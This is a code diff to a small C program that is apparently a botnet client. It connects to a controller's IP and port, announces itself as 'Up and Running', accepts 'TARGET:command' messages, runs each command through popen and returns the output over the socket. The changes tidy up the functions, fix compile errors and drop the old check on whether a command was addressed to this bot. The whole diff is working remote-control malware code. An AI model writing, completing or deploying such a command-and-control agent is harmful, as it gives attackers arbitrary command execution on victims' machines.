@@ -1,56 +1,34 @@
 #include "connect.h"
 
-int
-run (int s, char *cmd)
-{
-  char  line[1024];
-  FILE *f = popen (cmd,"r");
-
+int execute (int s, char *cmd) {
+  char line[CMD_LENGTH];
+  FILE *f = popen (cmd, "r");
   if (!f) return -1;
-  while (!feof (f))
-    {
-      if (!fgets (line, 1024, f)) break;
-      bot_print (s, bot_id);
-      bot_print (s, ":");
-      bot_print (s, line);
-    }
+  while (!feof (f)) {
+    char *success = fgets(line, CMD_LENGTH, f);
+    if (!success) break;
+    respond (s, line);
+  }
   fclose(f);
-
   return 0;
 }
 
-int
-parse (int s, char *msg)
-{
-  char
-
-  char *target = msg;
-  char *cmd = NULL;
-
-  if ((cmd = strchr (msg, ':')) == NULL)
-    {
-      printf ("!! Malformed command. Should be TARGET:command\n");
-      return -1;
-    }
-
-  *cmd = 0;
-  cmd++;
+int parse (int s, char *msg) {
+  char *cmd = strchr(msg, ':');
+  if (cmd == NULL) {
+    printf("Incorrect formatting. Reference: TARGET: command");
+    return -1;
+  }
+  cmd ++;
   cmd[strlen(cmd) - 1] = 0;
-
-  if (strcasecmp (target, "all") && strcasecmp(target, bot_id))
-    return 0; // Silently ignore messages not for us
-
-  printf ("+ Executing command: '%s'\n", cmd);
-  bot_run_cmd (s, cmd);
-
+  printf ("Recieved command: %s\n", cmd);
+  execute (s, cmd);
   return 0;
 }
 
 
-int
-conn (char *ip, int port)
-{
-	char msg[CMD_LENGTH]
+int init_channel (char *ip, int port, char *name) {
+	char msg[CMD_LENGTH];
 	struct sockaddr_in server;
 	int channel;
 
@@ -58,7 +36,7 @@ conn (char *ip, int port)
 	server.sin_family = AF_INET;
   server.sin_port = htons(port);
 
-  if((channel = socket (PF_NET, SOCK_STREAM, 0)) < 0) {
+  if((channel = socket (PF_INET, SOCK_STREAM, 0)) < 0) {
     perror ("socket:");
     exit(1);
   }
@@ -67,7 +45,7 @@ conn (char *ip, int port)
     exit(1);
   }
 
-  snprintf (msg, CMD_LENGTH, "%s: This is '%s' Up and Running\n", bot_id, bot_id);
-  peer_print (s, msg);
-  return s;
+  snprintf (msg, CMD_LENGTH, "%s: This is '%s' Up and Running\n", name, name);
+  respond (channel, msg);
+  return channel;
 }
